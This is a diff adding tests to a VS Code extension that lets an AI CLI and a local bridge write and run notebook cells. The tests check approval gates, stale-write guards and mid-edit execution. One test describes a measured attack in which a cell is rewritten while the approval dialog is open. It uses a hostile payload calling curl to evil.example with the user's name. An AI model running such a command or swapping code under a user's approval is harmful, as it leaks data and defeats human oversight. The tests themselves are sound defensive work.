@@ -64,6 +64,15 @@ function newNotebook(cells = []) {
   return notebook;
 }
 
+/**
+ * Cell executions only. `executed` records EVERY executeCommand the extension
+ * makes - setContext among them - so asserting it is empty asserts almost
+ * nothing about whether code ran.
+ */
+function ranCells() {
+  return vscode.__test.executed.filter((e) => e.name === 'notebook.cell.execute');
+}
+
 /* ------------------------------- unfence -------------------------------- */
 
 test('unfence strips a fenced block with a language tag', () => {
@@ -1027,6 +1036,68 @@ test('replacing a cell with nothing is refused, not obeyed', async () => {
   }
 });
 
+test('a replace can state what it expects to be replacing', async () => {
+  // /cells clips a cell at 4000 characters, and nothing stopped a caller
+  // reconstructing a clipped cell and writing the truncation back over the real
+  // one. Indices shift under a live editor too, so "cell 7" at read time need
+  // not be cell 7 now. Optional in 0.6.0, so existing callers keep working.
+  const original = 'x = 1  # the real thing';
+  const notebook = newNotebook(['import x', original]);
+  const seen = [];
+  const bridge = new Bridge({
+    resolveNotebook: () => notebook,
+    decideRun: async () => ({ run: false, reason: 'test policy' }),
+    infoDir: BRIDGE_HOME,
+    notify: (kind, message) => seen.push({ kind, message }),
+  });
+  const { port, token } = await bridge.start(0);
+  try {
+    const stale = await call(port, token, {
+      path: `/cell/replace?index=1&expect=${encodeURIComponent('what I read earlier')}`,
+      body: JSON.stringify({ code: 'x = 2' }),
+    });
+    assert.strictEqual(stale.status, 409, 'a stale expectation is refused');
+    assert.match(JSON.parse(stale.body).error, /does not contain what you expected/);
+    assert.strictEqual(notebook.cellAt(1).document.getText(), original, 'nothing destroyed');
+
+    const good = await call(port, token, {
+      path: `/cell/replace?index=1&expect=${encodeURIComponent(original)}`,
+      body: JSON.stringify({ code: 'x = 2  # corrected' }),
+    });
+    assert.strictEqual(good.status, 200, 'a matching expectation goes through');
+    assert.strictEqual(notebook.cellAt(1).document.getText(), 'x = 2  # corrected');
+
+    // A cell changing under the user's cursor left NO trace at all: no log line,
+    // nothing on screen. Ctrl+Z only helps somebody who noticed.
+    assert.strictEqual(seen.length, 1, 'the user is told a cell was rewritten');
+    assert.match(seen[0].message, /rewrote cell 1/);
+  } finally {
+    await bridge.stop();
+  }
+});
+
+test('a clipped cell says so on the cell itself, not once for the response', async () => {
+  // `truncated` was a single response-level flag, so a caller deciding whether
+  // it may safely rewrite cell 7 learned only that SOMETHING somewhere had been
+  // clipped. That is the read half of the hazard `expect=` guards on the write.
+  const notebook = newNotebook(['short = 1', `long = "${'a'.repeat(5000)}"`]);
+  const bridge = new Bridge({
+    resolveNotebook: () => notebook,
+    decideRun: async () => ({ run: false, reason: 'test policy' }),
+    infoDir: BRIDGE_HOME,
+  });
+  const { port, token } = await bridge.start(0);
+  try {
+    const res = await call(port, token, { method: 'GET', path: '/cells' });
+    const d = JSON.parse(res.body);
+    assert.strictEqual(d.truncated, true, 'the response still summarises');
+    assert.ok(!d.cells[0].truncated, 'the short cell is whole');
+    assert.strictEqual(d.cells[1].truncated, true, 'and the long one says so itself');
+  } finally {
+    await bridge.stop();
+  }
+});
+
 test('the MCP server speaks enough of the protocol to be driven', async () => {
   const sent = [];
   const realWrite = process.stdout.write;
@@ -1239,6 +1310,95 @@ test('a failure in the FINAL write is undone and explained, not left in the cell
   });
 });
 
+test('a cell the user edited mid-stream is never executed', async () => {
+  // `foreign` was computed and then read by NOTHING outside this file. With
+  // execution 'always', end() returns the DOCUMENT on a foreign edit - the
+  // user's own half-typed line - and pump fed exactly that into decideExecution
+  // and ran it. Under 'ask' the modal showed them their own code and asked
+  // whether to run "this newly generated code". This is the gate the 0.3.0
+  // ownership work existed to make possible and never wired up.
+  await withFakeClaude('slow', async (binary) => {
+    const extension = require(path.join('..', 'extension.js'));
+    const notebook = newNotebook(['answer = 42']);
+    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
+    vscode.window.visibleNotebookEditors.push(editor);
+    vscode.window.activeNotebookEditor = editor;
+
+    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
+    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
+    // The permissive setting, on purpose: this must hold at its weakest.
+    vscode.__test.config.set('aiNotebookLive.execution', 'always');
+    vscode.__test.inputs.push('make it handle bad input');
+
+    const typed = 'import subprocess  # MY OWN HALF-TYPED LINE';
+    let seen = 0;
+    vscode.__test.onBeforeApply = () => {
+      seen += 1;
+      // The user types AFTER the first flush has landed. Deliberately not a
+      // microtask: onBeforeApply is awaited, so a microtask runs while the edit
+      // is still in flight and the write splices into the typing instead - real,
+      // reproducible, and a different bug (see the applyEdit-window test).
+      if (seen === 1) setTimeout(() => { notebook.cellAt(0).document.text = typed; }, 0);
+    };
+
+    const context = {
+      subscriptions: [],
+      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
+    };
+    extension.activate(context);
+    try {
+      await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
+      assert.strictEqual(
+        notebook.cellAt(0).document.getText(),
+        typed,
+        'the writer stops rather than overwriting a person'
+      );
+      assert.deepStrictEqual(
+        ranCells(),
+        [],
+        "the user's own half-typed line must never be executed"
+      );
+    } finally {
+      vscode.__test.onBeforeApply = null;
+      vscode.window.activeNotebookEditor = undefined;
+      await extension.deactivate();
+    }
+  });
+});
+
+test('a generation the user did not touch still runs when they asked for that', async () => {
+  // The control for the two gates above. Without it, a runApproved that simply
+  // never ran anything would leave both of them green - measured: breaking it
+  // that way was caught only by the bridge's own control, not by anything on
+  // the extension's path.
+  await withFakeClaude('ok', async (binary) => {
+    const extension = require(path.join('..', 'extension.js'));
+    const notebook = newNotebook(['answer = 42']);
+    const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
+    vscode.window.visibleNotebookEditors.push(editor);
+    vscode.window.activeNotebookEditor = editor;
+
+    vscode.__test.config.set('aiNotebookLive.provider', 'claude-cli');
+    vscode.__test.config.set('aiNotebookLive.claudePath', binary);
+    vscode.__test.config.set('aiNotebookLive.execution', 'always');
+    vscode.__test.inputs.push('simplify it');
+
+    const context = {
+      subscriptions: [],
+      secrets: { get: async () => undefined, store: async () => undefined, delete: async () => undefined },
+    };
+    extension.activate(context);
+    try {
+      await vscode.__test.commands.get('aiNotebookLive.reviseCell')();
+      assert.strictEqual(notebook.cellAt(0).document.getText(), 'print(1)');
+      assert.strictEqual(ranCells().length, 1, 'an untouched cell runs as the user asked');
+    } finally {
+      vscode.window.activeNotebookEditor = undefined;
+      await extension.deactivate();
+    }
+  });
+});
+
 test('a hung CLI is given up on instead of wedging the extension', async () => {
   // stream() never settling meant guard()'s finally never ran, state.active was
   // never cleared, and EVERY later command was refused for the life of the
@@ -1375,6 +1535,109 @@ test('decideExecution never throws, whatever it is handed', async () => {
     const d = await policyModule.decideExecution({ ...req, blocking: false });
     assert.strictEqual(typeof d.run, 'boolean', `${JSON.stringify(req)} must still answer`);
   }
+});
+
+test('approving a cell approves THAT code, not whatever the cell holds later', async () => {
+  // Measured attack, three HTTP calls and one dialog: push a cell with
+  // bridge.execution 'ask' (the bridge answers immediately with pending:true and
+  // prompts afterwards), rewrite that same cell while the dialog is open, then
+  // click Run. The modal showed print("totally harmless"); os.system(...) ran.
+  const notebook = newNotebook(['seed = 1']);
+  const harmless = 'print("totally harmless")';
+  const hostile = 'import os; os.system("curl -s https://evil.example/$(whoami)")';
+
+  const bridge = new Bridge({
+    resolveNotebook: () => notebook,
+    // Stands in for the user reading the modal and clicking "Run it" - after
+    // something else has rewritten the cell underneath them.
+    decideRun: async ({ preview, onLateApproval }) => {
+      assert.strictEqual(preview, harmless, 'the dialog is shown the harmless code');
+      setTimeout(async () => {
+        notebook.cellAt(1).document.text = hostile;
+        await onLateApproval();
+      }, 0);
+      return { run: false, pending: true, reason: 'waiting for your approval in VS Code' };
+    },
+    infoDir: BRIDGE_HOME,
+  });
+  const { port, token } = await bridge.start(0);
+  try {
+    const res = await call(port, token, {
+      path: '/cell?position=end',
+      body: JSON.stringify({ code: harmless }),
+    });
+    assert.strictEqual(res.status, 200);
+    assert.strictEqual(JSON.parse(res.body).pending, true);
+    await new Promise((r) => setTimeout(r, 20));
+    assert.deepStrictEqual(
+      ranCells(),
+      [],
+      'code the user was never shown must not run on their approval'
+    );
+  } finally {
+    await bridge.stop();
+  }
+});
+
+test('an approval still runs the cell when nothing changed', async () => {
+  // The guard above is only correct if the ordinary path survives it.
+  const notebook = newNotebook(['seed = 1']);
+  const code = 'print("as approved")';
+  const bridge = new Bridge({
+    resolveNotebook: () => notebook,
+    decideRun: async ({ onLateApproval }) => {
+      setTimeout(() => onLateApproval(), 0);
+      return { run: false, pending: true, reason: 'waiting' };
+    },
+    infoDir: BRIDGE_HOME,
+  });
+  const { port, token } = await bridge.start(0);
+  try {
+    await call(port, token, { path: '/cell?position=end', body: JSON.stringify({ code }) });
+    await new Promise((r) => setTimeout(r, 20));
+    assert.strictEqual(ranCells().length, 1, 'an unchanged cell still runs');
+  } finally {
+    await bridge.stop();
+  }
+});
+
+test('one approval does not hand the bridge every future push', async () => {
+  // The grant is keyed on intent alone, so "Always run these this session" on
+  // one agent's harmless cell approved EVERY later push from ANY local program
+  // for the life of the window. Your own generations keep the button, because
+  // you asked for each of them by name; nothing asks you before an agent pushes.
+  policyModule.forgetSessionGrants();
+  vscode.__test.shown.length = 0;
+  vscode.__test.picks.push('Always run these this session');
+  await policyModule.decideExecution({
+    intent: 'bridge',
+    preview: 'print("first, looks fine")',
+    opts: policyOpts('never', 'ask'),
+    blocking: true,
+  });
+  const offered = vscode.__test.shown.filter((s) => s.kind === 'warning');
+  assert.ok(offered.length >= 1, 'the user is asked');
+  for (const ask of offered) {
+    assert.ok(
+      !(ask.items || []).includes('Always run these this session'),
+      'a blanket session grant must not be offered for agent-pushed code'
+    );
+  }
+  // And your own generations keep it.
+  vscode.__test.shown.length = 0;
+  vscode.__test.picks.push('Run it');
+  await policyModule.decideExecution({
+    intent: 'generate',
+    preview: 'print("mine")',
+    opts: policyOpts('ask'),
+    blocking: true,
+  });
+  const mine = vscode.__test.shown.filter((s) => s.kind === 'warning');
+  assert.ok(
+    (mine[0].items || []).includes('Always run these this session'),
+    'the convenience stays where the user asked for each cell themselves'
+  );
+  policyModule.forgetSessionGrants();
 });
 
 test('an unrecognised caller does not inherit a permissive setting', async () => {
